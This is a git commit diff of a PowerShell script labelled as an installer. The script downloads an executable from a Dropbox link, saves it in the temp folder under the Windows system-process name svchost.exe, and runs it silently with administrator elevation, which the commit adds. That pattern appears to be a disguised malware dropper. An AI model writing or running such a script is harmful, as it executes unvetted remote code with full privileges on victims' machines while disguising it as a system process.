39afc680c70a3550b79b0b78e6a54481402d47a4
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-03-07 12:10:23 +0600

    Run installer with elevated privileges
    Updated the script to run the installer as an administrator.

--- installnx.ps1
+++ installnx.ps1
@@ -1,21 +1,7 @@
 # install.ps1
 
-# Check if running as Administrator
-$isAdmin = ([Security.Principal.WindowsPrincipal] `
-[Security.Principal.WindowsIdentity]::GetCurrent()
-).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
-# If not admin, relaunch script as admin
-if (-not $isAdmin) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    exit
-}
-
-# Download file
 $u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
 $p = "$env:TEMP\svchost.exe"
 
 Invoke-RestMethod $u -OutFile $p
-
-# Run installer silently
-Start-Process $p -ArgumentList "/silent /norestart" -Wait
+Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
